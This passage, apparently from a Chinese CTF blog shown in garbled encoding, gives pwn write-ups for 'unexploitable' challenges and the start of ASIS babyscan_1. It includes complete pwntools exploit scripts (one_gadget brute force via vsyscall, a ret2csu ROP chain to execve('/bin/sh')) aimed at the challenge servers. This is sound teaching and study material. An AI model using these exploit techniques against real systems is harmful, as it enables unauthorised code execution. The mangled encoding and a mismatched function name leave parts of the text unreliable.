åœ¨pwnable.krçš„åŸºç¡€ä¸Šï¼Œå»æ‰äº†ç¨‹åºä¸­çš„`syscall`æŒ‡ä»¤\n\n## åˆ†æ\n\né¢˜ç›®ç»™äº†ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åº`unexploitable`å’Œlibcæ–‡ä»¶`libc_64.so.6`ã€‚å…ˆçœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯ï¼š\n\n- 64ä½åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œæœªå»ç¬¦å·è¡¨ï¼›\n- gotè¡¨å¯å†™ï¼Œæ ˆæœªå¼€canaryï¼Œæ ˆä¸å¯æ‰§è¡Œï¼Œæœªå¼€ä»£ç æ®µéšæœºåŒ–\n- libcç‰ˆæœ¬æ˜¯2.23\n\n```bash\n$ file unexploitable \nunexploitable: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=aba2c1fb7a4bca286d75e23006f9fe01dfcb03c2, not stripped\n\n$ checksec unexploitable \n[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)\n[*] '/home/bling/Downloads/tw-unexploitable/unexploitable'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n\n$ strings libc_64.so.6| grep version\nversionsort64\nversionsort\nargp_program_version_hook\ngnu_get_libc_version\nargp_program_version\nRPC: Incompatible versions of RPC\nRPC: Program/version mismatch\n<malloc version=\"1\">\nPrint program version\n(PROGRAM ERROR) No version known!?\n%s: %s; low version = %lu, high version = %lu\nGNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.\nCompiled by GNU CC version 5.4.0 20160609.\n\tcrypt add-on version 2.1 by Michael Glad and others\n.gnu.version\n.gnu.version_d\n.gnu.version_r\n\n```\n\nè¿è¡Œè¯¥ç¨‹åºï¼Œè¾“å…¥è¶…é•¿å­—ç¬¦ä¸²åï¼Œç¨‹åºå´©æºƒ\n\n```bash\n$ ./unexploitable \n111111111111111111111111111111111111111111111111111111111111111111111\n[1]    32752 segmentation fault (core dumped)  ./unexploitable\n```\n\nIDAä¸­æŸ¥çœ‹ç¨‹åºä¸»è¦é€»è¾‘ï¼Œå¾ˆæ˜æ˜¾çš„ä¸€ä¸ªæ ˆæº¢å‡º\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char buf[16]; // [rsp+0h] [rbp-10h] BYREF\n\n  sleep(3u);\n  return read(0, buf, 0x100uLL);\n}\n```\n\n## è°ƒè¯•\n\nä½¿ç”¨å¦‚ä¸‹è„šæœ¬å‘é€100ä¸ªå­—ç¬¦ç»™ç¨‹åºï¼Œè§‚å¯Ÿmainå‡½æ•°retæ—¶æ ˆé¡¶çš„æƒ…å†µ\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc_64.so.6\")\nmyio = process(myelf.path)\n\ngdb.attach(myio)\n\nsleep(3)\npayload = cyclic(100)\nmyio.send(payload)\n\nmyio.interactive()\n```\n\nå•æ­¥åˆ°retæŒ‡ä»¤å¤„ï¼Œæ­¤æ—¶æ ˆé¡¶çš„å››å­—èŠ‚ä¸ºgaaa\n\n```\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€\n0x007ffd2806b8d8â”‚+0x0000: \"gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]\"\t â† $rsp\n0x007ffd2806b8e0â”‚+0x0008: \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\"\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€\n     0x40056c <main+40>        mov    eax, 0x0\n     0x400571 <main+45>        call   0x400430 <read@plt>\n     0x400576 <main+50>        leave  \n â†’   0x400577 <main+51>        ret    \n[!] Cannot disassemble from $PC\n```\n\næ‰€ä»¥è¿”å›åœ°å€çš„åç§»ä¸º24\n\n```python\n>>> from pwn import *\n>>> cyclic_find(\"gaaa\")\n24\n```\n\né€šè¿‡æº¢å‡ºmainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ§åˆ¶æµåŠ«æŒåˆ°ä»»æ„åœ°å€ï¼Œå¦‚`0xdeadbeef`\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc_64.so.6\")\n\nmyio = process(myelf.path)\n\nsleep(3)\npayload = b\"a\"*24 + p64(0xdeadbeef)\nmyio.send(payload)\n\nmyio.interactive()\n```\n\n\n\n## åˆ©ç”¨\n\né€šè¿‡æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œåˆ°ä»»æ„åœ°å€ï¼Œä¸‹ä¸€æ­¥è¯¥æ€æ ·å‘¢ï¼Ÿ\n\n```bash\n$ strings unexploitable| grep system\n\n$ strings unexploitable| grep \"/bin/sh\"\n\n$ ROPgadget --binary=\"./unexploitable\" > rop.txt\n \n$ cat rop.txt| grep pop\n0x000000000040050b : add byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x000000000040050e : add esp, 8 ; pop rbx ; pop rbp ; ret\n0x000000000040050d : add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x000000000040064e : int1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x0000000000400536 : je 0x400540 ; pop rbp ; mov edi, 0x600e48 ; jmp rax\n0x000000000040064d : jne 0x400640 ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n0x0000000000400538 : pop rbp ; mov edi, 0x600e48 ; jmp rax\n0x0000000000400512 : pop rbp ; ret\n0x0000000000400511 : pop rbx ; pop rbp ; ret\n0x000000000040064c : push qword ptr [rbp - 0xf] ; add rsp, 8 ; pop rbx ; pop rbp ; ret\n\n$ cat rop.txt| grep syscall\n\n$ objdump -R ./unexploitable\n\n./unexploitable:     file format elf64-x86-64\n\nDYNAMIC RELOCATION RECORDS\nOFFSET           TYPE              VALUE \n0000000000600fe0 R_X86_64_GLOB_DAT  __gmon_start__\n0000000000601000 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5\n0000000000601008 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5\n0000000000601010 R_X86_64_JUMP_SLOT  sleep@GLIBC_2.2.5\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰åˆé€‚çš„gadgetï¼Œç¨‹åºä¸­æ²¡æœ‰syscallæŒ‡ä»¤ï¼Œgotè¡¨ä¸­æ²¡æœ‰puts/write/printfçš„ä¿¡æ¯æ³„éœ²å‡½æ•°ã€‚é‚£æˆ‘ä»¬ç°åœ¨æœ‰ä»€ä¹ˆå‘¢ï¼Ÿ\n\n- é€šç”¨gadgetæ®µï¼ˆlibc_csu_initï¼‰å¯ç”¨\n- vsyscallï¼ˆ0xffffffffff600000ï¼‰åŒºåŸŸå­˜åœ¨ï¼Œå¯ä»¥å½“ä½œä¸€ä¸ªret\n- read/systemå‡½æ•°åœ¨libcä¸­åç§»ä¸€å®šä½ç½®æœ‰syscallæŒ‡ä»¤\n\næ‰€ä»¥ï¼Œæ€»çš„æ€è·¯è¿˜æ˜¯è¦ä¹ˆæš´ç ´ï¼Œè¦ä¹ˆé€šè¿‡ROP(syscall)æˆ–è€…SROP\n\n### æ–¹æ³•1 vsyscallæš´ç ´é€šè§£ \n\n> æœ¬åœ°æ‰“æˆåŠŸäº†ï¼Œè¿œç¨‹æœªæˆåŠŸ\n\næ£€æŸ¥æº¢å‡ºå­—èŠ‚ï¼ŒæŸ¥çœ‹`ret`æ—¶æ ˆä¸­æƒ…å†µ\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./unexploitable\")\nmylibc = ELF(\"./libc_64.so.6\")\n\nmyio = process(myelf.path)\n\nsleep(3)\npayload = b\"a\"*24 + b\"b\"\nmyio.send(payload)\n\nmyio.interactive()\n```\n\nå¦‚ä¸‹ï¼Œ`ret`æ—¶ï¼Œrspä¸­çš„å€¼æ­£å¥½ä¸ºlibcä¸­åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ‰¾ä¸€æ¡åˆé€‚çš„onegadgetï¼Œè¿›è¡Œæš´ç ´ã€‚\n\n![image-20221031141752231](image-20221031141752231.png?size=600)\n\næ ¹æ®æ ˆä¸­çš„çŠ¶æ€åŠonegadgetçš„é™åˆ¶æ¡ä»¶ï¼Œç¡®å®šlibcä¸­åç§»ä¸º`0xf0567`çš„gadgetå¯ç”¨\n\n![image-20221031142446714](image-20221031142446714.png?size=600)\n\næœ¬åœ°çš„è„šæœ¬ä»£ç å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    try:\n        myio = process(\"./unexploitable\")\n        payload = b\"a\"*24 + b\"\\xfc\\xc2\\xba\"  # one_gadget: 0x10a2fc\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n```\n\nè¿œç¨‹ä»£ç å¦‚ä¸‹ï¼Œä½†æ˜¯æœªæˆåŠŸï¼Œè·‘åˆ°800å¤šæ¬¡çš„æ—¶å€™è¿œç¨‹æœåŠ¡å™¨æ— å“åº”äº†\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\na = 0\t\t\t# ç”¨äºè®¡æ•°\nwhile True:\n    try:\n        myio = remote(\"chall.pwnable.tw\",10403)\n        sleep(3)\n        payload = b\"a\"*24 + b\"\\x67\\x05\\x9a\"  # 0xf0567,0xef6c4,0x4526a\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.sendline(\"ls\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        a += 1\n        print(\"[+++] {:d}\".format(a))\n        myio.close()\n\n```\n\n### æ–¹æ³•2 ROP\n\n> åˆ©ç”¨ret2csu+readå‡½æ•°å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼\n\nROPçš„æ€è·¯å¦‚ä¸‹ï¼š\n\n1. æ”¹sleepçš„gotè¡¨é¡¹å†…å®¹ï¼Œä½1å­—èŠ‚æ”¹æˆ`\"\\xDE\"`ã€‚sleepåœ¨libcä¸­çš„åç§»ä¸º`0xCB680`ï¼Œåœ¨`0xCB6DE`å¤„æ˜¯ä¸€æ¡syscallæŒ‡ä»¤ã€‚\n2. å°†â€œ/bin/sh\\x00â€å†™åˆ°bssæ®µï¼Œå†™å…¥æ€»é•¿åº¦ä½59ï¼Œè¿”å›åraxè¢«ç½®ä¸º59\n3. å¸ƒç½®å¥½rdiï¼Œrsiï¼Œrdxä¸‰ä¸ªå‚æ•°çš„å€¼ï¼Œé€šè¿‡syscallå®Œæˆ`execve(\"/bin/sh\",0,0)`çš„è°ƒç”¨ï¼Œè·å¾—shell\n\nå®Œæ•´åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\ncsu_first_addr = 0x4005e6\ncsu_second_addr = 0x4005d0\n\ndef csu_chain(rbx, rbp):\n    payload = b'a'*24 + p64(csu_first_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601000) + p64(0) + p64(0x601010) + p64(1)     # read(0,0x601010,1)\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601000) + p64(0) + p64(0x601030) + p64(59)     # read(0,0x601040,59)\n    payload += p64(csu_second_addr)\n    payload += p64(0x0) + p64(rbx) + p64(rbp) + p64(0x601010) + p64(0x601030) + p64(0) + p64(0)     # execve(0x601030,0,0)\n    payload += p64(csu_second_addr)\n    return payload\n\nmyio = remote(\"chall.pwnable.tw\",10403)\n\n# myio = process(\"./unexploitable\")\n# gdb.attach(myio,\"b *0x4005d6 \\n c\")\n\npayload = csu2(0,1)\nsleep(3)\nmyio.send(payload)\nsleep(0.03)\n# myio.send(b\"\\xa2\")      # local:\\xa2 , ubuntu1804\nmyio.send(b\"\\xde\")        # remote: \\xde\nsleep(0.03)\nmyio.send(b\"/bin/sh\\x00\"+b\"a\"*51)\n\nmyio.interactive()\n```\n\n### æ–¹æ³•3 SROP\n\n> æ ˆè¿ç§»+sigreturn\n\nå‚è€ƒwpï¼šhttps://github.com/zj3t/pwnable.tw\n\n\n\n### å…¶ä»–æš´ç ´æ€è·¯\n\n1. æ”¹read_gotä¸ºonegadget\n\n   readå‡½æ•°åœ¨libcä¸­çš„åç§»ï¼š0xf6670\n\n   `0xf0567`è¿™æ¡gadgetçš„åç§»ï¼š0xf0567\n\n   åªéœ€è¦æš´ç ´åŠä¸ªå­—èŠ‚\n\n2. æ”¹sleep_gotä¸ºexecve\n\n   > æœ¬åœ°æ‰“æˆåŠŸäº†ï¼Œè¿œç¨‹æœªæˆåŠŸ\n\n   sleepå‡½æ•°åœ¨libcä¸­çš„åç§»ï¼š0xCB680\n\n   execveå‡½æ•°åœ¨libcä¸­çš„åç§»ï¼š0xCBBC0\n\n   åˆ†ä¸‰æ­¥ï¼š\n\n   - å…ˆæŠŠ\"/bin/sh\"å†™åˆ°bssæ®µï¼Œ0x60130\n   - å†å¸ƒç½®å¥½rdi,rsi,rdxï¼Œï¼ˆåˆ©ç”¨csu gadgetï¼‰\n   - å›åˆ°è°ƒç”¨sleepå¤„\n\n\n\n# ç¥¥äº‘æ¯2022 unexploitable\n\né™„ä»¶ï¼š[unexploitable.tar](unexploitable.tar)\n\n## åˆ†æ\n\näºŒè¿›åˆ¶åŸºæœ¬ä¿¡æ¯\n\n```bash\n$ file ./unexploitable \n./unexploitable: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d66afeabecb7b7190cfbdbc4bb6b5846c896e2a, stripped\n$ checksec ./unexploitable\n[*] '/home/bling/Downloads/unexploitable'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n\n```\n\nIDAæ‰“å¼€çœ‹mainå‡½æ•°é€»è¾‘ï¼Œå¾ˆæ˜æ˜¾æœ‰ä¸ªæ ˆæº¢å‡º\n\n```c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  sub_7D0();\n  return 0LL;\n}\n\nssize_t sub_7D0()\n{\n  char buf[16]; // [rsp+0h] [rbp-10h] BYREF\n\n  return read(0, buf, 0x30000uLL);\t\t/*æ ˆæº¢å‡º*/\n}\n```\n\næ‰§è¡ŒäºŒè¿›åˆ¶ï¼Œç¡®è®¤è¾“å…¥è¶…é•¿å­—ç¬¦ä¸²ä¼šä½¿ç¨‹åºå´©æºƒ\n\n```bash\n$ ./unexploitable \naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSegmentation fault (core dumped)\n```\n\n## è°ƒè¯•\n\nè¿™ä¸ªé¢˜ç›´æ¥ç”¨`gdb ./unexploitable`è°ƒè¯•çš„è¯ï¼Œæ‰§è¡Œå®Œ`read(0, buf, 0x30000uLL)`å°†è¿”å›`-1`ï¼Œä¸çŸ¥é“æ˜¯æœ‰åè°ƒè¯•è¿˜æ˜¯å’‹ã€‚æœ€ç»ˆç”¨pwntoolsçš„gdb.attach()å®ç°çš„è°ƒè¯•ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyio = process(\"./unexploitable\")\ngdb.attach(myio)\nsleep(3)\npayload = cyclic(50)\nmyio.send(payload)\nmyio.interactive()\n```\n\nå¾—åˆ°åç§»24åçš„8byteæ•°æ®ä¼šè¦†ç›–`sub_7D0()`å‡½æ•°è¿”å›æ—¶çš„`RIP`\n\n```\n>>> from pwn import *\n>>> cyclic_find(\"gaaa\")\n24\n```\n\né€šè¿‡å¦‚ä¸‹è„šæœ¬ï¼Œå¯ä»¥å®ç°åŠ«æŒæ§åˆ¶æµåˆ°ä»»æ„åœ°å€`ret_addr`ã€‚\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyio = process(\"./unexploitable\")\ngdb.attach(myio)\nsleep(3)\nret_addr = 0xdeadbeef\npayload = b\"a\"*24 + p64(ret_addr)\nmyio.send(payload)\nmyio.interactive()\n```\n\n## åˆ©ç”¨\n\näºæ˜¯è¿™ä¸ªé¢˜ï¼Œæœ€è®©äººå›°æ‰°çš„åœ°æ–¹åˆ°äº†ã€‚å¼€äº†PIEï¼ŒGOTè¡¨åªè¯»ï¼Œæ²¡æœ‰`puts/write/printf`ç­‰å¯ä»¥æ³„éœ²åœ°å€çš„å‡½æ•°ã€‚æ‰€ä»¥è¿™ä¸ª`ret_addr`æ”¹æˆä»€ä¹ˆå‘¢ï¼Ÿ\n\næ­¤æ—¶æ— æ³•é€šè¿‡æ³„éœ²è·å¾—å®Œæ•´çš„åœ°å€ï¼Œè€Œæ ˆä¸Šè¿”å›åœ°å€æ˜¯è¿”å›åˆ°mainä¸­çš„ã€‚å¦‚æœåˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªåœ°å€ï¼Œ`ret_addr`åªè¦†ç›–ä½1å­—èŠ‚ï¼Œæˆ–è€…ä½2å­—èŠ‚ï¼Œæ˜¯å¯ä»¥å®ç°è·³è½¬åˆ°textæ®µæŸä¸ªåœ°å€å¤„æ‰§è¡Œçš„ã€‚ä½†æ˜¯ç¢ç£¨äº†ä¸€åœˆä¹Ÿæ²¡æƒ³åˆ°åˆé€‚çš„ä»£ç ç‰‡æ®µã€‚\n\næŸ¥çœ‹`sub_7D0()`å‡½æ•°è¿”å›æ—¶çš„çŠ¶æ€ï¼Œå¦‚ä¸‹å›¾ã€‚å¦‚æœé€šè¿‡æ ˆæº¢å‡ºå°†`+0x0000`å’Œ`+0x0008`è·³è¿‡ï¼Œè¦†ç›–`+0x0010`ä½å­—èŠ‚ä¸ºæŸä¸ªonegadgetçš„å€¼ï¼Œå¹¶å°†å…¶popåˆ°ripä¸­ï¼Œå°±èƒ½å®ç°get shellã€‚\n\n![image-20221030021539691](image-20221030021539691.png?size=600)\n\næ€ä¹ˆpopå‘¢ï¼Ÿ`0xffffffffff600000[vsyscall]`åŒºåŸŸï¼Œå¯ä»¥å½“ä½œä¸€ä¸ªå•ç‹¬çš„`ret` gadgetï¼Œèƒ½æ»¡è¶³ä¸Šè¿°è¦æ±‚ã€‚\n\né¢˜ç›®ç»™çš„libcä¸­æœ‰å¦‚ä¸‹ä¸‰ä¸ªone_gadgetï¼Œæ ¹æ®è°ƒè¯•æ—¶å†…å­˜çŠ¶æ€ï¼Œé€‰æ‹©äº†`0x4f302`è¿™ä¸ªã€‚\n\n```bash\n0x4f2a5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f302 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a2fc execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\nå› æ­¤ï¼Œæˆ‘ä»¬åªéœ€å°†æ ˆä¸­è¦†ç›–æˆå¦‚ä¸‹çŠ¶æ€ï¼Œå°±èƒ½è¾¾åˆ°æ‰§è¡Œlibcä¸­one_gadgetçš„ç›®çš„ã€‚å…¶ä¸­`302`æ˜¯å›ºå®šçš„ï¼Œ`x4f`å¯ä»¥éšæœºé€‰æ‹©ï¼Œæˆ‘ä»¬éœ€è¦æš´ç ´è¿™1.5ä¸ªå­—èŠ‚ï¼Œæ¦‚ç‡ä¸º`1/(2^12) = 1/4096`ã€‚\n\n![image-20221030022435819](image-20221030022435819.png?size=600)\n\næœ€ç»ˆæˆ‘é€‰æ‹©çš„æš´ç ´ç›®æ ‡æ˜¯\"84f302\"ï¼Œä»£ç å¦‚ä¸‹ï¼Œåœ¨æœ¬åœ°æœ‰ä¸€å®šçš„æ¦‚ç‡get shellã€‚\n\n```python\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"error\")\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    try:\n        myio = process(\"./unexploitable\")\n        vsyscall_addr = 0xffffffffff600000\n        payload_str = b\"a\"*24 + p64(vsyscall_addr)+ p64(vsyscall_addr) + b\"\\x02\\xf3\\x84\"\n        myio.send(payload_str)\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n\n```\n\nä½†æ˜¯ï¼Œæ‰“è¿œç¨‹çš„æ—¶å€™æœ‰äº›å¥‡æ€ªç°è±¡å‡ºç°ï¼Œéœ€è¦è¿ç»­è¾“å…¥4æ¬¡æ‰æœ‰ååº”ï¼Œæ‰“è¿œç¨‹çš„expå¦‚ä¸‹\n\n```python\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"error\")\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    try:\n        # mymyio = process(\"./unexploitable\")\n        myio = remote(\"ip\",port)\n        vsyscall_addr = 0xffffffffff600000\n        payload = b\"a\"*24 + p64(vsyscall_addr)+ p64(vsyscall_addr) + b\"\\x02\\xf3\\x84\"\n        myio.send(payload)\n        sleep(0.03)\n        myio.send(payload)\n        sleep(0.03)\n        myio.send(payload)\n        sleep(0.03)\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n```\n\n## çŸ¥è¯†ç‚¹ - vsyscall\n\nä½¿ç”¨vmmapå¯ä»¥çœ‹åˆ°vsyscallåŒºåŸŸï¼Œå®ƒçš„èµ·å§‹åœ°å€æ˜¯å›ºå®šçš„0xffffffffff600000ï¼Œå¯ä»¥å°†è¯¥åœ°å€æŠ½è±¡ä¸ºä¸€ä¸ª`ret`ï¼ˆè¯¦ç»†æƒ…å†µè§æ–‡ç« ï¼š[vsyscall bypass pie](https://www.cnblogs.com/luoleqi/p/13579478.html)ï¼‰ã€‚\n\n```bash\ngefâ¤  vmmap\n[ Legend:  Code | Heap | Stack ]\nStart              End                Offset             Perm Path\n......\n0x007fffda5e5000 0x007fffda5e6000 0x00000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]\t\t# è¿™é‡Œ\n```\n\nåœ¨ubuntu16.04ä¸­ï¼Œè¯¥åŒºåŸŸå¯è¯»ã€‚æˆ‘ä»¬å¯ä»¥åœ¨gdbä¸­æŸ¥çœ‹åˆ°è¯¥åŒºåŸŸçš„å†…å®¹ï¼š\n\n```bash\ngefâ¤  vmmap\n......\n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\ngefâ¤  x/5i 0xffffffffff600000\n   0xffffffffff600000:\tmov    rax,0x60\t\t\t# sys_gettimeofday\n   0xffffffffff600007:\tsyscall \t\t\t\t# æ³¨æ„ï¼ŒåŠ«æŒæ§åˆ¶æµç›´æ¥åˆ°syscallè¿™é‡Œæ˜¯ä¸å¯è¡Œçš„\n   0xffffffffff600009:\tret    \n   0xffffffffff60000a:\tint3   \n   0xffffffffff60000b:\tint3     \ngefâ¤  x/5i 0xffffffffff600400\n   0xffffffffff600400:\tmov    rax,0xc9\t\t\t# sys_time\n   0xffffffffff600407:\tsyscall \n   0xffffffffff600409:\tret    \n   0xffffffffff60040a:\tint3   \n   0xffffffffff60040b:\tint3     \ngefâ¤  x/5i 0xffffffffff600800\n   0xffffffffff600800:\tmov    rax,0x135\t\t# sys_getcpu\n   0xffffffffff600807:\tsyscall \n   0xffffffffff600809:\tret    \n   0xffffffffff60080a:\tint3   \n   0xffffffffff60080b:\tint3      \n```\n\n\n\n\n\n","categories":["CTF"]},{"title":"ASIS CTF 2022 pwn babyscan_1 babyscan_2","url":"/2022/10/17/asis-ctf-2022-pwn/","content":"\n\n\n# babyscan_1\n\né¢˜ç›®é™„ä»¶ï¼š[babyscan_1_12c5d902584e857a4f680aa1575d2fd81e08ec03.txz](babyscan_1_12c5d902584e857a4f680aa1575d2fd81e08ec03.txz)\n\n## é¢˜ç›®åˆ†æ\n\nä¸¤é“é¢˜éƒ½ç»™äº†æºç ï¼Œç¬¬ä¸€é¢˜mainå‡½æ•°æºç å¦‚ä¸‹\n\n```c\nint main() {\n  char size[16], fmt[8], *buf;\n\n  printf(\"size: \");\n  scanf(\"%15s\", size);\t\t\t// è¾“å…¥éœ€è¦allocaå†…å­˜çš„å¤§å°ï¼Œå¯è¾“å…¥çš„é•¿åº¦æ˜¯15ä¸ªå­—ç¬¦\n  if (!isdigit(*size)) {\t\t// ä»…åˆ¤æ–­è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œè¦æ±‚ä¸ºæ•°å­—\n    puts(\"[-] Invalid number\");\n    return 1;\n  }\n\n  buf = (char*)alloca(atoi(size) + 1);\t\t// allocaè¡¨ç¤ºåœ¨æ ˆä¸Šç”³è¯·ä¸€æ®µç©ºé—´ï¼Œatoiä»…è¯†åˆ«è¿ç»­æ•°å­—éƒ¨åˆ†\n\n  printf(\"data: \");\n  snprintf(fmt, sizeof(fmt), \"%%%ss\", size);\t// å°†è¾“å…¥çš„sizeè½¬ä¸º\"%[size]s\"ï¼Œç”±äºfmtä»…å 8å­—èŠ‚ï¼Œsizeå­—ç¬¦ä¸²è¿‡é•¿ä¼šå†²æ‰åé¢çš„\"s\"\n  scanf(fmt, buf);\t\t\t// fmtä½œä¸ºæ ¼å¼è¯å­—ç¬¦ï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†è¾“å…¥è½¬åŒ–åˆ°bufä¸­\n\n  return 0;\n}\n```\n\näºŒè¿›åˆ¶çš„åŸºæœ¬ä¿¡æ¯å¦‚ä¸‹ï¼š\n\n```bash\n$ file chall      \nchall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b31cf6b807484f2d04a80ceb67725cdb0f0785cd, for GNU/Linux 3.2.0, not stripped\n\n$ checksec chall      \n[*] '/home/bling/Downloads/1014-asis/baby_scan_1/bin/chall'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\t\t\t\t# éƒ¨åˆ†RELROè¯´æ˜GOTè¡¨å¯å†™\n    Stack:    No canary found\t\t\t# æ— canaryï¼Œå¦‚æœæ˜¯æ ˆæº¢å‡ºæ¼æ´ï¼Œåˆ©ç”¨å°†ç®€å•å¾ˆå¤š\n    NX:       NX enabled\t\t\t\t# æ ˆå’Œbssæ®µä¸å¯æ‰§è¡Œ\n    PIE:      No PIE (0x400000)\t\t\t# æœªå¼€PIEï¼Œä»£ç æ®µæ— éšæœºåŒ–ï¼Œæœ‰åŠ©äºåˆ©ç”¨\n```\n\næ ¹æ®æºç åŠäºŒè¿›åˆ¶ä¿¡æ¯å¯ä»¥æ¨æµ‹ï¼Œè¿™é¢˜æ˜¯è®©æˆ‘ä»¬ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ•´ä¸€ä¸ªæ ˆæº¢å‡ºã€‚\n\nsizeå¦‚æœè¾“å…¥ä¸º22ï¼Œallocaç”³è¯·23çš„ç©ºé—´ï¼ˆ`buf[23]`ï¼‰ï¼Œæœ€åä¸€ä¸ªscanfå°±ä¸º`scanf(\"%22s\",buf)`ï¼Œä¸ä¼šäº§ç”Ÿæº¢å‡ºã€‚\n\næ‰€ä»¥ï¼Œåº”è¯¥æ€æ ·æ¥æ„é€ è¾“å…¥å‘¢ï¼Ÿ\n\nè¿˜è®°å¾—[æ ¼å¼åŒ–å­—ç¬¦ä¸²æ ¼å¼](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_4)ä¸­çš„`n$` 